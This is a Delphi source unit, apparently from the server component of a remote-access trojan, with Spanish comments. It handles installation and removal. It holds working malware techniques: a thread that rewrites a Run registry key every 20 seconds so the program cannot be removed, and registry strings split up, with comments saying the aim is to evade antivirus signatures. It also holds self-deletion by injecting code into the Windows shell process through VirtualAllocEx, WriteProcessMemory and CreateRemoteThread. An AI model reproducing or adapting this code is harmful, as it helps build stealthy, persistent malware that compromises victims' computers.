{sin uso desde  0.53}unit UnitInstalacion;

interface

uses
  Windows,
  SysUtils,
  TLHelp32,
  ShellApi,
  SettingsDef,
  UnitVariables,
  UnitFunciones,
  UnitProcess,
  UnitFileManager,
  UnitRegistro;


procedure Desinstalar();

implementation

procedure BorrarseASiMismo(hProcessToInjectTo: cardinal);
 //  coded by FoRSaKeN^    
 //Inyecta un thread en el parametro que se le pase que se encarga de borrar ParamStr(0)
type
  TData = record
    _DeleteFileA: Pointer;
    _ExitThread: Pointer;
    _Sleep:  Pointer;
    _szFile: Pointer;
  end;

  procedure LoadProc(param: Pointer); stdcall;
  var
    Inject: TData;
  begin
    Inject := TData(param^);
    asm
             @del:
             PUSH    1000
             CALL    Inject._Sleep
             PUSH    Inject._szFile
             CALL    Inject._DeleteFileA
             CMP     EAX,0
             JE      @del
             PUSH    0
             CALL    Inject._ExitThread
    end;
  end;

var
  Written, ThreadID: cardinal;
  Params, Proc: Pointer;
  pData:  TData;
  Handle: hWnd;

begin
  if hProcessToInjectTo = 0 then
    exit;
  //------------------------------------------------------------------------------
  pData._DeleteFileA := GetProcAddress(GetModuleHandle(kernel32), 'DeleteFileA');
  pData._ExitThread := GetProcAddress(GetModuleHandle(kernel32), 'ExitThread');
  pData._Sleep  := GetProcAddress(GetModuleHandle(kernel32), 'Sleep');
  //------------------------------------------------------------------------------
  pData._szFile := VirtualAllocEx(hProcessToInjectTo, nil, Length(Configuracion.sCopyTo+Configuracion.sFileNameToCopy) +
    1, $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, pData._szFile, PChar(Configuracion.sCopyTo+Configuracion.sFileNameToCopy),
    Length(Configuracion.sCopyTo+Configuracion.sFileNameToCopy) + 1, Written);
  //------------------------------------------------------------------------------
  Params := VirtualAllocEx(hProcessToInjectTo, nil, SizeOf(TData), $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, Params, @pData, SizeOf(TData), Written);
  if Written <> SizeOf(TData) then
    exit;
  //------------------------------------------------------------------------------
  Proc := VirtualAllocEx(hProcessToInjectTo, nil, 500, $3000, $40);
  WriteProcessMemory(hProcessToInjectTo, Proc, @LoadProc, 500, Written);
  if Written <> 500 then
    exit;
  //------------------------------------------------------------------------------
  Handle := CreateRemoteThread(hProcessToInjectTo, nil, 0, Proc, Params, 0, ThreadID);
  if Handle = 0 then
    exit;
  //------------------------------------------------------------------------------
end;


var
  ThreadAutoInicioID: cardinal;

procedure AutoInicio;
var
  Clave: string;
begin
  while True do
  begin
    //Ahora me agrego al autoinico
    //Metodo policies
    if Configuracion.bArranqueRun then
    begin
      //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
      //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
      //Y si no, es por pura diversión :)
      Clave := 'HKEY_CURRENT_';
      Clave := Clave + 'USER\Software\Micro';
      Clave := Clave + 'soft\Windows\Cu';
      Clave := Clave + 'rrentVer';
      Clave := Clave + 'sion\Run';

      Clave := Clave + '\' + Configuracion.sRunRegKeyName;
      AniadirClave(PChar(Clave), ParamStr(0), 'REG_SZ');
    end;
    Sleep(20000); //20 sec
  end;
end;

procedure CrearThreadAutoInicio;
//Crea un nuevo Thread en el que el server se agrega al auto inicio cada 20 segundos, para que no lo puedan borrar :)
begin
  BeginThread(nil, 0, @AutoInicio, nil, 0, ThreadAutoInicioID);
end;

function TerminarThreadAutoInicio: boolean;
  //Cierra el thread
begin
  Result := False;
  if ThreadAutoInicioID > 0 then
  begin
    EndThread(ThreadAutoInicioID);
    Result := True;
  end;
end;

procedure Desinstalar();
var
  Clave: string;
  //  DeleteBat : TextFile;
  //  i : byte;
  WindowsShellPID: DWord;
begin
  //ahora remuevo las claves que haya agregado al registro
  if Configuracion.bArranqueRun then
  begin
    //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
    //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
    //Y si no, es por pura diversión :)
      Clave := 'HKEY_CURRENT_';
      Clave := Clave + 'USER\Software\Micro';
      Clave := Clave + 'soft\Windows\Cu';
      Clave := Clave + 'rrentVer';
      Clave := Clave + 'sion\Run';
      Clave := Clave+'\'+ Configuracion.sRunRegKeyName;
    BorraClave(Clave);
  end;

  //En esta clave se guarda el nombre del server cuando se cambia desde el cliente
  Clave := 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\WinXpMemory';
  BorraClave(Clave);

{  //Borrarse a si mismo... con un bat
  //Primero me quito los permisos readonly, oculto y de sistema para que el bat me pueda borrar
  try
  //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
    i := GetFileAttributes( PChar(ParamStr(0)) );
    i := i and $00000002;//faHidden;
    i := i and $00000001;//faReadOnly;
    i := i and $00000004;//faSysFile;
    if SetFileAttributes(PChar(ParamStr(0)), i) then
    //si logro sacar los atributos entonces crea el bat que lo borra el server y se borra a si mismo
    //de lo contrario solo me suicido, y quedará el archivo del servver pero no corriendo
    begin
    AssignFile(DeleteBat, ExtractFileDir(ParamStr(0)) + '\Uninstall.bat');
    Rewrite(DeleteBat);
    WriteLn(DeleteBat,'@Echo OFF');
    WriteLn(DeleteBat, ':Loop');
    WriteLn(DeleteBat, 'del %1');
    WriteLn(DeleteBat, 'if exist %1 goto Loop');
    WriteLn(DeleteBat, 'del %0');
    WriteLn(DeleteBat, 'exit');
    CloseFile(DeleteBat);
    ShellExecute(GetForegroundWindow(), 'open', PChar(ExtractFileDir(ParamStr(0)) + '\Uninstall.bat'), PChar(ParamStr(0)), PChar(ExtractFileDir(ParamStr(0))), SW_HiDE);
    end;
  except
     end; }

  //Borrarse a si mismo con inyección en la shell de windows
  GetWindowThreadProcessID(FindWindow('Shell_TrayWnd', nil), @WindowsShellPID);
  BorrarseASiMismo(OpenProcess(Process_All_Access, False{bInheritHandle},
    WindowsShellPID));        

  //y me suicido.
  exitprocess(0);
end;

end.
